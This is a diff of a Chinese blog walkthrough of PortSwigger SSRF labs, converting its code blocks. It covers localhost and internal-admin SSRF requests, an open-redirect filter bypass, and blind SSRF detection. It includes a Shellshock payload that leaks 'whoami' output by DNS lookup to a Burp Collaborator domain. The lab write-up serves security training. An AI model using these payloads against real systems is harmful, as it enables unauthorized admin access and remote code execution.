@@ -208,18 +208,30 @@
 <h2 id="常见的-SSRF-攻击"><a href="#常见的-SSRF-攻击" class="headerlink" title="常见的 SSRF 攻击"></a>常见的 SSRF 攻击</h2><p><strong>SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。</strong>这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。</p>
 <h3 id="针对服务器本身的SSRF攻击"><a href="#针对服务器本身的SSRF攻击" class="headerlink" title="针对服务器本身的SSRF攻击"></a>针对服务器本身的SSRF攻击</h3><p>在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如<code>127.0.0.1</code>（指向环回适配器的保留 IP 地址）或<code>localhost</code>（同一适配器的常用名称）。</p>
 <p>例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br></pre></td></tr></table></figure>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+</code></pre>
 <p>这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。</p>
 <p>在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
+stockApi=http://localhost/admin
+</code></pre>
 <p>在这里，服务器将获取<code>/admin</code>URL 的内容并将其返回给用户。</p>
 <p>当然，攻击者可以直接访问<code>/admin</code>URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对<code>/admin</code>URL 的请求来自本地机器本身时，会绕过正常的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control">访问控制。</a>应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。</p>
 <h3 id="针对其他后端系统的-SSRF-攻击"><a href="#针对其他后端系统的-SSRF-攻击" class="headerlink" title="针对其他后端系统的 SSRF 攻击"></a>针对其他后端系统的 SSRF 攻击</h3><p>服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。</p>
 <p>在前面的示例中，假设后端 URL 有一个管理界面<code> https://192.168.0.68/admin</code>。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
+stockApi=http://192.168.0.68/admin
+</code></pre>
 <h2 id="针对本地服务器的基本SSRF"><a href="#针对本地服务器的基本SSRF" class="headerlink" title="针对本地服务器的基本SSRF"></a>针对本地服务器的基本SSRF</h2><h3 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">web-security/ssrf/lab-basic-ssrf-against-localhost</a></p>
 <h3 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>
 <p>要完成这个实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>
@@ -319,14 +331,18 @@
 <h2 id="通过开放重定向漏洞绕过的-SSRF防御"><a href="#通过开放重定向漏洞绕过的-SSRF防御" class="headerlink" title="通过开放重定向漏洞绕过的 SSRF防御"></a>通过开放重定向漏洞绕过的 SSRF防御</h2><p>有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。</p>
 <p>在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。</p>
 <p>例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net</span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net
+</code></pre>
 <p>返回重定向到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil-user.net</span><br></pre></td></tr></table></figure>
-
+<pre><code>http://evil-user.net
+</code></pre>
 <p>您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+<pre><code>POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
+stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin
+</code></pre>
 <p>这个 SSRF 漏洞利用有效，因为应用程序首先验证<code>stockAPI</code>提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p>
 <h3 id="靶场地址-4"><a href="#靶场地址-4" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection">web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</a></p>
 <h3 id="靶场说明-4"><a href="#靶场说明-4" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>
@@ -338,13 +354,13 @@
 <p>2、点击“下一个产品”，观察<code>path</code>参数被放入重定向响应的Location头中，导致开放重定向。</p>
 <p><img src="https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png"></p>
 <p>3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的<code>stockApi</code>参数中。构造payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product/nextProduct?path=http://192.168.0.12:8080/admin</span><br></pre></td></tr></table></figure>
-
+<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin
+</code></pre>
 <p>   观察库存检查器是否遵循重定向并向您显示管理页面。</p>
 <p><img src="https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png"></p>
 <p>4、修改路径以删除目标用户：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</span><br></pre></td></tr></table></figure>
-
+<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+</code></pre>
 <p><img src="https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png"></p>
 <p>成功删除carlos,完成实验。</p>
 <h2 id="盲-SSRF-漏洞"><a href="#盲-SSRF-漏洞" class="headerlink" title="盲 SSRF 漏洞"></a>盲 SSRF 漏洞</h2><p>盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。</p>
@@ -352,14 +368,16 @@
 <h3 id="盲-SSRF-漏洞的影响是什么？"><a href="#盲-SSRF-漏洞的影响是什么？" class="headerlink" title="盲 SSRF 漏洞的影响是什么？"></a>盲 SSRF 漏洞的影响是什么？</h3><p>盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。</p>
 <h3 id="如何发现和利用盲-SSRF-漏洞"><a href="#如何发现和利用盲-SSRF-漏洞" class="headerlink" title="如何发现和利用盲 SSRF 漏洞"></a>如何发现和利用盲 SSRF 漏洞</h3><p>检测盲 SSRF 漏洞最可靠的方法是使用带外 ( <a target="_blank" rel="noopener" href="https://portswigger.net/burp/application-security-testing/oast">OAST</a> ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。</p>
 <p>使用带外技术最简单、最有效的方法是使用<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>。您可以使用<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提示:</span><br><span class="line">在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。</span><br></pre></td></tr></table></figure>
-
+<pre><code>提示:
+在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。
+</code></pre>
 <h3 id="带外检测的盲SSRF"><a href="#带外检测的盲SSRF" class="headerlink" title="带外检测的盲SSRF"></a>带外检测的盲SSRF</h3><p>简单地识别可以触发带外 HTTP 请求的盲<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p>
 <h3 id="靶场地址-5"><a href="#靶场地址-5" class="headerlink" title="靶场地址"></a>靶场地址</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection">portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection</a></p>
 <h3 id="靶场说明-5"><a href="#靶场说明-5" class="headerlink" title="靶场说明"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p>
 <p>要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意事项:</span><br><span class="line">为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。</span><br></pre></td></tr></table></figure>
-
+<pre><code>注意事项:
+为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。
+</code></pre>
 <h3 id="实验步骤-3"><a href="#实验步骤-3" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、在<a target="_blank" rel="noopener" href="https://portswigger.net/burp/pro">Burp Suite Professional</a>中，转到 Burp 菜单并启动<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>。</p>
 <p><img src="https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png"></p>
 <p>2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。</p>
@@ -386,8 +404,8 @@
 <p><img src="https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png"></p>
 <p>5、将请求发送到产品页面给 Burp Intruder。</p>
 <p>6、使用<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator 客户端</a>生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</span><br></pre></td></tr></table></figure>
-
+<pre><code>() &#123; :; &#125;; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+</code></pre>
 <p>7、将 Burp Intruder 请求中的 User-Agent 字符串替换为包含您的 Collaborator 域的 Shellshock 有效负载。</p>
 <p>单击“清除 §”，将 Referer 标头更改为<code>http://192.168.0.1:8080</code>突出显示 IP 地址的最后一个八位字节（数字<code>1</code>），单击“添加 §”。</p>
 <p><img src="https://s2.loli.net/2022/07/21/SOEUW1uJGo2lNr8.png"></p>
